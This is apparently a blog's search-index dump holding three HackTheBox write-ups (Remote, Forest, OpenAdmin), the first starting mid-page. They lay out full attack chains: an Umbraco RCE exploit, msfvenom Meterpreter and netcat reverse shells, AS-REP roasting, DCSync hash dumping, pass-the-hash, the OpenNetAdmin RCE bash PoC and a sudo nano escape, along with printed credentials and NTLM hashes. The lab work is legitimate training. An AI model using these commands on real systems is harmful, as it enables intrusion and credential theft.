./App_Plugins/ModelsBuilder/modelsbuilder.htm ./App_Plugins/ModelsBuilder/modelsbuilder.resource.js ...\u0026lt;snip\u0026gt;... umbraco.config is a config file formatted in xml and umbraco.sdf is a database file.\n  The config file doesn\u0026rsquo;t store credentials.\nSince the database file is a binary, the strings and grep command can be used to display some readable strings such as \u0026ldquo;admin\u0026rdquo;.\n→ root@iamf «remote» «10.10.14.3» $ strings App_Data/umbraco.sdf | grep -i admin ...\u0026lt;snip\u0026gt;... Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{“hashAlgorithm”:”SHA1\u0026#34;}en-USf8512f97-cab1–4a4b-a49f-0a2054c47a1d adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{“hashAlgorithm”:”SHA1\u0026#34;}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50 adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{“hashAlgorithm”:”SHA1\u0026#34;}admin@htb.localen-US82756c26–4321–4d27-b429–1b5c7c4f882f User “admin” \u0026lt;admin@htb.local\u0026gt;192.168.195.1User “admin” \u0026lt;admin@htb.local\u0026gt;umbraco/user/password/changepassword change User “admin” \u0026lt;admin@htb.local\u0026gt;192.168.195.1User “admin” \u0026lt;admin@htb.local\u0026gt;umbraco/user/sign-in/logoutlogout success User “SYSTEM” 192.168.195.1User “admin” \u0026lt;admin@htb.local\u0026gt;umbraco/user/saveupdating LastLoginDate, ...\u0026lt;snip\u0026gt;... From the output above, I can only guess this is the correct pair of username and password. admin@htb.local:b8be16afba8c314ad33d812f22a04991b90e2aaa\nThe password that was identified as SHA1 can be cracked online with crackstation. The password is bacondandcheese\nFoothold Shell as IIS apppool Access on Umbraco CMS The credential can be used on Umbraco CMS.\nI can see the CMS version by accessing the menu on the left side. A quick search on Google reveals the current version is vulnerable to RCE.\n Offensive Security\u0026rsquo;s Exploit Database ArchiveUmbraco CMS 7.12.4 - (Authenticated) Remote Code Execution.. webapps exploit for ASPX platformwww.exploit-db.com\n I copied the exploit and ran it.\n→ root@iamf «Umbraco-RCE» «10.10.14.3» $ python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c powershell.exe -a ‘ls c:/’ Persistent Shell - Meterpreter I can upgrade the RCE to a persistent shell by sending a PowerShell one liner payload or use msfvenom to craft a payload.\n I don\u0026rsquo;t remember correctly, but I think I messed up with the one liner, so I go with msfvenom.\n Upload features from Umbraco didn\u0026rsquo;t restrict .exe file. It is located on /media and the directory of the uploaded file is located on C:/inetpub/wwwroot/media/[itemID]/payload.exe\nI\u0026rsquo;ll create a executable reverse shell and upload it to Umbraco /media page and have listener using Metasploit listening on the specified port.\n→ root@iamf «remote» «10.10.14.3» $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=4444 -a x86 -f exe \u0026gt; fremote.exe Then I\u0026rsquo;ll just execute my payload on C:/inetpub/wwwroot/media/1136/fremote.exe\n→ root@iamf «remote» «10.10.14.3» $ python exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c cmd.exe -a ‘C:/inetpub/wwwroot/media/1136/fremote.exe’ I can spawn PowerShell by typing\nexecute -f powershell.exe   Privilege Escalation Shell as Administrator I\u0026rsquo;m still not sure if that UsoSvc came from the box or was caused by other players, but in any case, I\u0026rsquo;ll show you two ways to escalate to administrator and local system.\nTeamViewer7 CVE-2019-18988 WinPEAS shows there\u0026rsquo;s TeamViewer7 service currently running. This version is vulnerable to CVE-2019-18988\nFrom https://nvd.nist.gov/vuln/detail/CVE-2019-18988:\n It used a shared AES key for all installations since at least as far back as v7.0.43148, and used it for at least OptionsPasswordAES in the current version of the product\n ========================================(Services Information)======================================== ... \u0026lt;snip\u0026gt; ... TeamViewer7(TeamViewer GmbH - TeamViewer 7)[\u0026#34;C:\\Program Files (x86)\\TeamViewer\\Version7\\TeamViewer_Service.exe\u0026#34;] - Auto - Running TeamViewer Remote Software ================================================================================================= UsoSvc(Update Orchestrator Service)[cmd \\c C:\\Users\\nc.exe 10.10.14.8 4444 -e cmd.exe] - Auto - Stopped - No quotes and Space detected YOU CAN MODIFY THIS SERVICE: AllAccess, Start Manages Windows Updates. If stopped, your devices will not be able download and install latest udpates. ================================================================================================= ... \u0026lt;snip\u0026gt; ... Because metasploit has a post module for that CVE, so I could simply the background current session and run the post module.\nmeterpreter \u0026gt; run post/windows/gather/credentials/teamviewer_passwords  Remote Access - Evil-WinRM The password itself is reused by the administrator account.\n→ root@iamf «remote» «10.10.14.3» $ evil-winrm -u administrator -p \u0026#39;!R3m0te!\u0026#39; -i htb.remote    (Alternative) Unquoted Service Path - UsoSvc If this unquoted service path was originally from the box, I could just modify the UsoSvc executable path to point to my previous uploaded payload\nPS C:\\\u0026gt; sc.exe config usosvc binPath=\u0026#34;C:/inetpub/wwwroot/media/1136/fremote.exe\u0026#34; I\u0026rsquo;ll set netcat listener on port 4444\n→ root@iamf «remote» «10.10.14.3» $ nc -nvlp 4444 Now on Remote, I can just start the service.\nPS C:\\\u0026gt; sc.exe start usosvc I don\u0026rsquo;t have any screenshots, but that should work.\n References  https://book.hacktricks.xyz/pentesting/nfs-service-pentesting  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-remote/","summary":"Remote features an instance of Umbraco CMS which is vulnerable to an authenticated remote code execution (RCE). Enumeration on publicly accessible backup on NFS share finds credentials, which allows me to gain a foothold on the system. From there, internal enumeration with WinPEAS finds two interesting privilege escalation vectors, the first one with TeamViewer7 and the other one is the ability to modify and restart an unquoted service path. TeamViewer7 is found to be vulnerable to CVE-2019-18988, Metasploit has a module to exploit this CVE and harvest the TeamViewer credentials.","tags":["OSCP-like","Windows","NFS","Metasploit","TeamViewer","CVE-2019-18988"],"title":"HackTheBox - Remote"},{"content":"When I first joined HackTheBox, Forest was the first machine that I was trying to own. It was an overall easy to medium difficulty machine.\nOn Forest, enumeration with anonymous logon/null session on RPC finds Active Directory users account and these can be used to perform AS-REP Roasting, it successfully obtains the Kerberos ticket-granting-ticket (TGT) of a service account. The TGT itself contains a password hash of the user that can be cracked offline, this allows me gain a foothold on the system. For the root part, the service account permissions allows me to grant myself a DCsync rights, this can be leveraged to pull Active Directory NTLM hashes and use them to gain access as NT Authority\\SYSTEM.\nSkills Learned  AS-REP roasting Creating Network Drive Abusing DCSync Rights  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux rpcclient - Preinstalled in Kali Linux Evil-WinRM - https://github.com/Hackplayers/evil-winrm BloodHound - https://github.com/BloodHoundAD/BloodHound Impacket - https://github.com/SecureAuthCorp/impacket  Reconnaissance Nmap → root@iamf «forest» «10.10.14.116» $ nmap -sV -sC -oA nmap/initial-forest 10.10.10.171 -v  -sC, to scan with default script -sV, to scan service version -oA, to save the output to all format (xml, nmap, gnmap) -v, verbose mode.  ...\u0026lt;snip\u0026gt;... PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-03-21 08:18:45Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=3/21%Time=5E75CC69%P=x86_64-pc-linux-gnu%r(DNSV SF:ersionBindReqTCP,20,\u0026#34;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\ SF:x04bind\\0\\0\\x10\\0\\x03\u0026#34;); Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h26m25s, deviation: 4h02m30s, median: 6m24s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2020-03-21T01:21:11-07:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-03-21T08:21:14 |_ start_date: 2020-03-20T05:27:17 ...\u0026lt;snip\u0026gt;... From the scan results, I\u0026rsquo;m dealing with a domain controller of an Active Directory system.\nWhen it comes to an Active Directory, I often to see people begin their enumeration from SMB (445) and sometimes LDAP (389). I\u0026rsquo;ll also follow that sequence because these three ports most likely to have anonymous login.\nEnumeration TCP 139,445 - SMB I can authenticate myself as anonymous/null session using both smbclient and rppclient. With current access I could get list of users and groups but not to file shares.\n→ root@iamf «forest» «10.10.14.116» $ rpcclient -U \u0026#39;%\u0026#39; \u0026#39;10.10.10.161\u0026#39; rpcclient $\u0026gt; rpcclient $\u0026gt; enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] ...\u0026lt;snip\u0026gt;... user:[sebastien] rid:[0x479] user:[lucinda] rid:[0x47a] user:[svc-alfresco] rid:[0x47b] user:[andy] rid:[0x47e] user:[mark] rid:[0x47f] user:[santi] rid:[0x480] I use this blog post from SANS as my reference.\nFoothold Shell as svc-alfresco ASREP Roasting In Active Directory, if there\u0026rsquo;s a user, that by any chance, has its Kerberos pre-authentication disabled, then we can use a tool from Impacket called GetNPUsers.py to obtain the user\u0026rsquo;s ticket-granting-ticket (TGT).\nWhen using Kerberos as an authentication protocol and the pre-auth is enabled, the client or user must provide a timestamp encrypted with their password hash for each request they send (KRB_AS_REQ). If the server reads a valid time from the request, it returns the user\u0026rsquo;s TGT along with Session Key encrypted with the user\u0026rsquo;s password hash (KRB_AS_REP).\nWith preauth disabled, the user doesn\u0026rsquo;t need to provide the timestamp. The server only validates them based on their usernames. Therefore, an attacker can send a replay attack/dummy request to obtain the TGT and brute force it offline (read more about it here)\nBelow is the overview of the Kerberos mechanism. The red circle is where the AS-REP roasting attack happened.\n  Taken from \u0026ldquo;Vulnerability Assessment of Authentication Methods in a Large-Scale Computer System\u0026rdquo; by David Freimanis\n GetNPUsers.py initiates a dummy request to Forest DC and successfully captures a TGT belongs to svc-alfresco\n→ root@iamf «forest» «10.10.14.116» $ GetNPUsers.py -dc-ip \u0026#39;10.10.10.171\u0026#39; -request htb.local/ -usersfile users -format Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation Name MemberOf PasswordLastSet LastLogon UAC ------------ ------------------------------------------------------ -------------------------- -------------------------- -------- svc-alfresco CN=Service Accounts,OU=Security Groups,DC=htb,DC=local 2020-03-26 09:40:41.035829 2020-03-26 09:41:40.077493 0x410200 $krb5asrep$23$svc-alfresco@HTB.LOCAL:cf77e95a8a50a6d7b298c46e851e93a7$ea7045cfe9b7583ebd9ba81934cf51330863f66e8b3c2c542981f6317b851980eae4e1a23048e95003cfb38c692075cabf9e3da009e3b1a0e17a34f6fd5d27aa1869a458faee9eff4bdbf5f5f3aaf826caf7e0326f52a522b630becd8f636b8b2fd11af194a18e86d07ad8a55299739684d8be527a9e75e16480db5177841cc7f54ab98891d1691b6ab7f4cbc576d0036820a6c3e59aeaee32e88628c88929e522af9b98ce169ea3bc369551a2925c76bd64e13a7a312119552dad92e9a43814e9033c5ad7d4d4c9808a968ebcc269a52e1f458a4d98c5d930068c52d15c5385c2d71f90933a Cracking TGT A Dictionary attack using hashcat successfully cracked the TGT and revealed the password of svc-alfresco\nhashcat64.exe -m 18200 svcalfresco.txt rockyou.txt -O  The password is s3rvice.\nRemote login - Evil-WinRM User svc-alfresco can login remotely via WinRM using evil-winrm.\n→ root@iamf «forest» «10.10.14.116» $ evil-winrm -i \u0026#39;10.10.10.161\u0026#39; -u svc-alfresco -p s3rvice User flag is done here.\n   Privilege Escalation Shell as NT Authority\\SYSTEM Enumeration with BloodHound After days, I couldn’t find a vulnerable application or services on this machine (this is prior to ZeroLogon), so I’ll use BloodHound to collect more information about object relationships within this Active Directory.\nFirst, I’ll host my own shares using smbserver.py from Impacket. This will make it easier to exfil and clean up data.\n→ root@iamf «forest» «10.10.14.116» $ mkdir shares; cd shares/ → root@iamf «shares» «10.10.14.116» $ smbserver.py myfj . -smb2support -username iamf -password iamf On Forest, I’ll use my share as a network drive.\n*Evil-WinRM* PS C:\\\u0026gt; $pass = ConvertTo-SecureString \u0026#39;belompi\u0026#39; -AsPlainText -Force *Evil-WinRM* PS C:\\\u0026gt; *Evil-WinRM* PS C:\\\u0026gt; $cred = New-Object System.management.automation.pscredential(\u0026#39;mikun\u0026#39;, $pass) *Evil-WinRM* PS C:\\\u0026gt; *Evil-WinRM* PS C:\\\u0026gt; New-PSDrive -Name mikun -PSProvider FileSystem -Credential $cred -Root \\\\[tun0ip]\\myfj *Evil-WinRM* PS C:\\\u0026gt; *Evil-WinRM* PS C:\\\u0026gt; cd mikun: I\u0026rsquo;ve already copied SharpHound.exe, the BloodHound ingestor, to my shares.\n   I’ll start collecting with -c all option to collect all.\n*Evil-WinRM* PS mikun:\\\u0026gt; .\\SharpHound.exe -c all  After it finishes, I’ll start the BloodHound GUI and then load the collected data by drag and drop.\n→ root@iamf «forest» «10.10.14.116» $ neo4j console \u0026amp; → root@iamf «forest» «10.10.14.116» $ bloodhound --no-sandbox \u0026amp; I marked svc-alfresco as ‘owned’ then used BloodHound pre-built analytics queries to find the shortest path from svc-alfresco to domain admin. The prebuilt query name is “Shortest Path from Owned Principal”.\n Path explanation, from top (nearest path to domain admin) to the bottom:\n Exchange Windows Permissions group has WriteDacl permission on AD domain. It simply allows you to modify the domain object’s permissions. Users, groups, computers, shares are domain objects. Account Operators group has GenericAll permissions on Exchange Windows Permissions group. It allows you to modify group membership like adding/removing a user to/from the group. Account Operators members have the ability to create a user. Privileged IT Accounts group has direct membership to the Account Operators group. User svc-alfresco is a direct member of Service Account group and it has indirect membership to the Privileged IT Accounts and the Account Operators group  Based on the path, here is the plan:\n Leverage Account Operators indirect membership to create a new user and join it to Exchange Windows Permission group Leverage Exchange Windows Permissions group permission to grant DS-Replication-Get-Changes-All (DCSync) to the new user.  Credential Dumping DCSync rights In Forest, I\u0026rsquo;ll have to load PowerView.ps1 first.\n*Evil-WinRM* PS mikun:\\\u0026gt; Import-Module .\\powerview.ps1 Then I\u0026rsquo;ll create a new user and join it to the Exchange Windows Permissions group.\n*Evil-WinRM* PS mikun:\\\u0026gt; net user mikun password /add /domain *Evil-WinRM* PS mikun:\\\u0026gt; *Evil-WinRM* PS mikun:\\\u0026gt; net group \u0026#34;Exchange Windows Permission\u0026#34; /add mikun After that, grant it DCSync rights\n*Evil-WinRM* PS mikun:\\\u0026gt; $pass = ConvertTo-SecureString \u0026#39;password\u0026#39; -AsPlainText -Force *Evil-WinRM* PS mikun:\\\u0026gt; *Evil-WinRM* PS mikun:\\\u0026gt; $cred = New-Object System.management.automation.pscredential(\u0026#39;mikun\u0026#39;, $pass) *Evil-WinRM* PS mikun:\\\u0026gt; *Evil-WinRM* PS mikun:\\\u0026gt; Add-DomainObjectAcl -Credential $cred -TargetIdentity \u0026#34;DC=htb, DC=local\u0026#34; -PrincipalIdentity mikun -Rights DCSync Now I can use secretsdump.py from Impacket with that user to perform a DCSync attack.\n→ root@iamf «forest» «10.10.14.116» $ secretsdump.py htb.local/mikun:\u0026#39;password\u0026#39;@10.10.10.161 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: .... \u0026lt;snip\u0026gt; .... htb.local\\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc::: htb.local\\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3::: htb.local\\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668::: htb.local\\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b::: htb.local\\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7::: htb.local\\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072::: .... \u0026lt;snip\u0026gt; .... [*] Cleaning up... Pass the Hash with psexec.py Administrator hash can be used with psexec.py from Impacket to gain shell access (pass-the-hash).\n→ root@iamf «forest» «10.10.14.116» $ psexec.py -hashes \u0026#39;aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6\u0026#39; administrator@10.10.10.161   References  https://www.sans.org/blog/plundering-windows-account-info-via-authenticated-smb-sessions/ https://www.diva-portal.org/smash/get/diva2:1358429/FULLTEXT01.pdf  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-forest/","summary":"When I first joined HackTheBox, Forest was the first machine that I was trying to own. It was an overall easy to medium difficulty machine.\nOn Forest, enumeration with anonymous logon/null session on RPC finds Active Directory users account and these can be used to perform AS-REP Roasting, it successfully obtains the Kerberos ticket-granting-ticket (TGT) of a service account. The TGT itself contains a password hash of the user that can be cracked offline, this allows me gain a foothold on the system.","tags":["OSCP-like","Windows","Active-Directory","Domain-controller","ASREP-roasting","BloodHound","SharpHound","PSdrive","DCSync","smbserver.py","evil-winrm","psexec.py"],"title":"HackTheBox - Forest"},{"content":"OpenAdmin is an easy difficulty machine from HackTheBox that starts off by finding an instance of OpenNetAdmin. This application is known to be vulnerable to a remote code execution, which then can be leveraged to gain a foothold on the system. Enumeration inside the box finds a database credentials and it is reused by one of the users. The first user has access to web resources that are currently hosted internally. The internal web has a logic flaw that allows me to obtain the SSH key of the second user. The second user is allowed to run a nano editor with sudo privileges, and this can be abused to gain root access.\nSkills Learned  OpenNetAdmin 18.1.1 exploitation Exploiting sudo privileges on nano  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux Dirb - Preinstalled in Kali Linux John The Ripper - https://www.openwall.com/john/  Reconnaissance Nmap → root@iamf «openadmin» «10.10.14.7» $ nmap -sV -sC -oA OpenAdmin \u0026#39;10.10.10.171\u0026#39; -v  -sC, to scan with default script -sV, to scan service version -oA, to save the output to all formats -v, verbose mode  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA) | 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA) |_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel From the scan results, nmap found two open ports:\n An SSH service running on port 22 An HTTP service running on port 80  Also, from the scan above, the machine is likely running Ubuntu.\nAs SSH usually requires valid credentials and there\u0026rsquo;s is no straight exploit yet, hence further enumeration is needed.\nEnumeration TCP 80 - Website Visiting the standard http port only displays the Apache default page.\n Directory Brute Force - dirb Running dirb against the web successfully discovered a few hidden paths.\n→ root@iamf «openadmin» «10.10.14.7» $ dirb http://10.10.10.171/ /usr/share/wordlists/dirb/common.txt -r ...\u0026lt;SNIP\u0026gt;... ---- Scanning URL: http://10.10.10.171/ ---- ==\u0026gt; DIRECTORY: http://10.10.10.171/artwork/ + http://10.10.10.171/index.html(CODE:200|SIZE:10918) ==\u0026gt; DIRECTORY: http:/10.10.10.171/music/ + http://10.10.10.171/server-status (CODE:200|SIZE:278) ...\u0026lt;SNIP\u0026gt;... /artwork/ Nothing here.\n /music/ The /music home page provides a login menu that points to http://openadmin.htb/ona\n /ona/ Visiting /ona/ brings me to an instance of OpenNetAdmin. It is a software for managing network related things.\n There\u0026rsquo;s a warning on the page. It’s complaining about not running the latest version compared to the one currently in use (v18.1.1)\nFoothold Shell as www-data Exploit PoC for OpenNetAdmin 18.1.1 Based on the version above, a quick search on exploit-db shows that the current instance of OpenNetAdmin is vulnerable to a remote code execution. The exploit PoC source code is as follows:\n PoC: https://www.exploit-db.com/exploits/47691\n #!/bin/bash  URL=\u0026#34;${1}\u0026#34; while true;do echo -n \u0026#34;$\u0026#34;; read cmd curl --silent -d \u0026#34;xajax=window_submit\u0026amp;xajaxr=1574117726710\u0026amp;xajaxargs[]=tooltips\u0026amp;xajaxargs[]=ip%3D%3E;echo \\\u0026#34;BEGIN\\\u0026#34;;${cmd};echo \\\u0026#34;END\\\u0026#34;\u0026amp;xajaxargs[]=ping\u0026#34; \u0026#34;${URL}\u0026#34; | sed -n -e \u0026#39;/BEGIN/,/END/ p\u0026#39; | tail -n +2 | head -n -1 done I saved the exploit to a file called OpenRCE.sh, and below is the issued command to run the exploit.\n→ root@iamf «openadmin» «10.10.14.7» $ ./OpenRCE.sh http://openadmin.htb/ona/  Privilege Escalation Shell as jimmy Enumeration Upon enumerating the current working directory, a database credential is found in ./local/config/database_settings.inc.php.\n$ cat ./local/config/database_settings.inc.php \u0026lt;?php $ona_contexts=array ( \u0026#39;DEFAULT\u0026#39; =\u0026gt; array ( \u0026#39;databases\u0026#39; =\u0026gt; array ( 0 =\u0026gt; array ( \u0026#39;db_type\u0026#39; =\u0026gt; \u0026#39;mysqli\u0026#39;, \u0026#39;db_host\u0026#39; =\u0026gt; \u0026#39;localhost\u0026#39;, \u0026#39;db_login\u0026#39; =\u0026gt; \u0026#39;ona_sys\u0026#39;, \u0026#39;db_passwd\u0026#39; =\u0026gt; \u0026#39;n1nj4W4rri0R!\u0026#39;, \u0026#39;db_database\u0026#39; =\u0026gt; \u0026#39;ona_default\u0026#39;, \u0026#39;db_debug\u0026#39; =\u0026gt; false, ), ), \u0026#39;description\u0026#39; =\u0026gt; \u0026#39;Default data context\u0026#39;, \u0026#39;context_color\u0026#39; =\u0026gt; \u0026#39;#D3DBFF\u0026#39;, ), ); SSH access The password worked for user jimmy, but the user flag can not be found in jimmy’s home directory.\n Shell as joanna Enumeration The find command is issued again to search files that is accessible or owned by user jimmy.\njimmy@openadmin:~$ find / -type f -user jimmy 2\u0026gt;/dev/null ...\u0026lt;SNIP\u0026gt;... /var/www/internal/main.php /var/www/internal/logout.php /var/www/internal/login.php ...\u0026lt;SNIP\u0026gt;... It successfully reveals that user jimmy has access to files in /var/www/internal/.\nBased on apache config, /var/www/internal is currently hosted locally on port 52846.\njimmy@openadmin:~$ cat /etc/apache2/sites-enabled/internal.conf Listen 127.0.0.1:52846 \u0026lt;VirtualHost 127.0.0.1:52846\u0026gt; ServerName internal.openadmin.htb DocumentRoot /var/www/internal \u0026lt;IfModule mpm_itk_module\u0026gt; AssignUserID joanna joanna \u0026lt;/IfModule\u0026gt; ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined \u0026lt;/VirtualHost\u0026gt; Code review - Improper redirection After inspecting the main.php source code from /var/www/internal/, a logic flaw was found on the first line.\njimmy@openadmin:/var/www/internal/$ cat main.php \u0026lt;?php session_start(); if (!isset ($_SESSION[\u0026#39;username\u0026#39;])) { header(\u0026#34;Location: /index.php\u0026#34;); }; # Open Admin Trusted # OpenAdmin $output = shell_exec(\u0026#39;cat /home/joanna/.ssh/id_rsa\u0026#39;); echo \u0026#34;\u0026lt;pre\u0026gt;$output\u0026lt;/pre\u0026gt;\u0026#34;; ?\u0026gt; \u0026lt;html\u0026gt; \u0026lt;h3\u0026gt;Don\u0026#39;t forget your \u0026#34;ninja\u0026#34; password\u0026lt;/h3\u0026gt; Click here to logout \u0026lt;a href=\u0026#34;logout.php\u0026#34; tite = \u0026#34;Logout\u0026#34;\u0026gt;Session \u0026lt;/html\u0026gt; This line code has an improper redirection.\n\u0026lt;?php session_start(); if (!isset ($_SESSION[\u0026#39;username\u0026#39;])) { header(\u0026#34;Location: /index.php\u0026#34;); # `die();` or `exit();` function should be called here. \t}; ...\u0026lt;SNIP\u0026gt;... $output = shell_exec(\u0026#39;cat /home/joanna/.ssh/id_rsa\u0026#39;); echo \u0026#34;\u0026lt;pre\u0026gt;$output\u0026lt;/pre\u0026gt;\u0026#34;; ?\u0026gt;...\u0026lt;SNIP\u0026gt;... The code above checks users' sessions but it\u0026rsquo;s not complete yet because the die() or exit() function is missing, so the rest of the code below will be executed as well. Therefore, sending a normal request with curl (default without -L option) will prevent the page from redirection and then it renders joanna\u0026rsquo;s SSH key.\njimmy@openadmin:~$ curl -s http://127.0.0.1:52846/main.php  Password cracking The private key is encrypted with a password. JtR can be used to crack an encrypted SSH key, but first, it must be converted to the hash form and this can be done by using ssh2john.py\n→ root@iamf «openadmin» «10.10.14.7» $ python ssh2john.py joanna_rsa \u0026gt; joanna_rsa.hash The password was successfully cracked within 17s. The cracking process is performed on my Windows machine.\njohn.exe user2.txt --wordlist=rockyou.txt  SSH access Now I can login as user joanna via SSH.\n→ root@iamf «openadmin» «10.10.14.7» $ ssh -i joanna_rsa joanna@10.10.10.171  The user flag is done here.\nShell as root Abusing sudo nano User joanna has sudo privileges on /bin/nano\n On linux boxes, whenever you own a valid user password, always check sudo -l !\n joanna@openadmin:~$ sudo -l Matching Defaults entries for joanna on openadmin: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User joanna may run the following commands on openadmin: (ALL) NOPASSWD: /bin/nano /opt/priv A quick way to read the root flag is by issuing the command below,\njoanna@openadmin:~$ sudo /bin/nano /opt/priv and then hit CTRL + R to open a file, this allows us to read the root flag at /root/root.txt\n   To gain root shell as follows I\u0026rsquo;ll follow the instruction from GTFOBins page:\njoanna@openadmin:~$ sudo /bin/nano /opt/priv # Opening nano as root ^R^X # CTRL+R (read/open file), CTRL+X(execute command) reset; sh 1\u0026gt;\u0026amp;0 2\u0026gt;\u0026amp;0 # Escape from nano ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-openadmin/","summary":"OpenAdmin is an easy difficulty machine from HackTheBox that starts off by finding an instance of OpenNetAdmin. This application is known to be vulnerable to a remote code execution, which then can be leveraged to gain a foothold on the system. Enumeration inside the box finds a database credentials and it is reused by one of the users. The first user has access to web resources that are currently hosted internally.","tags":["OSCP-like","Linux","Code-review","Webshell","Password-cracking","sudo","GTFOBins"],"title":"HackTheBox - OpenAdmin"}]